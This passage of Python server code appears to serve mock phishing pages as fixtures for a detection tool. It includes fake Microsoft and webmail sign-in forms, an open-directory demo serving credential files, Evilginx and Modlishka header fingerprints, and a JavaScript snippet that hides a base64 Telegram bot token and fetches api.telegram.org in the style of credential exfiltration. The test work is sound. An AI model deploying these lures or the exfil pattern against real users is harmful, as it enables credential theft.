_TALL = ("<!doctype html><html><head><title>Tall test page</title></head><body style='margin:0;font-family:sans-serif'>"
         + "".join(f"<div style='height:220px;background:{'#12233a' if i % 2 else '#1a3350'};color:#fff;"
                   f"font-size:44px;padding:24px'>Block {i} — scroll test</div>" for i in range(30))
         + "</body></html>")


@app.get("/demo-tall/")
async def demo_tall():
    """A ~6600px scrollable page for testing the take-over scroll/interaction forwarding."""
    return HTMLResponse(_TALL)


_HANG = ("<!doctype html><html><head><title>Please wait — verifying your request</title></head>"
         "<body style='margin:0;font-family:sans-serif'>"
         "<h1 style='padding:20px'>Please wait — we are verifying your request. Do not close this window.</h1>"
         "<form><input name='q' placeholder='type here to test' style='font-size:24px;padding:10px;margin:20px'></form>"
         + "".join(f"<div style='height:220px;background:{'#12233a' if i % 2 else '#1a3350'};color:#fff;"
                   f"font-size:44px;padding:24px'>Block {i} — scroll/click/type test</div>" for i in range(30))
         + "</body></html>")


@app.get("/demo-hang/")
async def demo_hang():
    """A tall 'please wait' page that never advances — the walker sits in wait-for-advance (~65s),
    giving a stable take-over window to test scroll/click/type forwarding. Has a text input too."""
    return HTMLResponse(_HANG)


@app.api_route("/demo-opendir/{page:path}", methods=["GET", "POST"])
async def demo_opendir(page: str = ""):
    p = page.strip("/")
    body = _OD_PAGES.get(p, _OD_LISTING)
    if p and p != "sub":                       # files served as text/plain (creds/source), listings as HTML
        return Response(body, media_type="text/plain")
    return HTMLResponse(body)


# ── built-in AiTM/reverse-proxy MOCK (safe) to test aitm.py end-to-end ────────────────────────────
# Reproduces only the OBSERVABLE fingerprints of Evilginx/Modlishka (headers + cookies) — it does NOT
# proxy anything, capture credentials, or make any outside connection. Detonate:
#   http://127.0.0.1:8090/demo-aitm/evilginx   or   http://127.0.0.1:8090/demo-aitm/modlishka
_AITM_LOGIN = ("<!doctype html><html><head><title>Sign in to your Microsoft account</title>" + _PHISH_CSS +
               "</head><body><div class='box'><div class='logo'>Microsoft</div><h1>Sign in</h1>"
               "<form method='POST' action='#'><input type='email' name='login' placeholder='Email'>"
               "<input type='password' name='passwd' placeholder='Password'>"
               "<button>Sign in</button></form></div></body></html>")


_JSEXFIL_TG = _demo_tg("7391827465", "AAF")   # inert fake, assembled (see _demo_tg) — id + 35-char secret
_JSEXFIL_PAGE = ("<!doctype html><html><head><title>Sign in - Acme Webmail</title>" + _PHISH_CSS +
                 "<script src='/demo-jsexfil/app.js'></script></head><body><div class='box'>"
                 "<div class='logo'>Acme Mail</div><h1>Sign in</h1>"
                 "<form method='POST' action='#'><input type='email' name='u' placeholder='Email'>"
                 "<input type='password' name='p' placeholder='Password'><button>Sign in</button></form>"
                 "</div></body></html>")
# the exfil Telegram token lives ONLY in the external .js (base64) — invisible to an HTML-only scan
_JSEXFIL_JS = ("var _c=atob('" + b64encode(('bot=' + _JSEXFIL_TG + ';chat=99887').encode()).decode() + "');"
               "function ship(d){fetch('https://api.telegram.org/bot'+_c);}")


@app.api_route("/demo-jsexfil/{page:path}", methods=["GET", "POST"])
async def demo_jsexfil(page: str = ""):
    if page.strip("/") == "app.js":
        return Response(_JSEXFIL_JS, media_type="application/javascript")
    return HTMLResponse(_JSEXFIL_PAGE)


@app.api_route("/demo-aitm/{variant}", methods=["GET", "POST"])
async def demo_aitm(variant: str = "evilginx"):
    resp = HTMLResponse(_AITM_LOGIN)
    if variant.strip("/").lower() == "modlishka":
        # Modlishka's default trackingCookie is 'id'=UUID (and on HTTPS it strips the Secure flag)
        resp.headers["set-cookie"] = "id=550e8400-e29b-41d4-a716-446655440000; Path=/; HttpOnly"
        resp.headers["cache-control"] = "no-cache, no-store"
    else:  # evilginx
        resp.headers["x-evilginx"] = "operator@example.test"       # toolkit header leaked into the response
        resp.headers["set-cookie"] = "__el=eyJsdXJlIjoibXMifQ; Path=/"
        resp.headers["cache-control"] = "no-cache, no-store"
    return resp
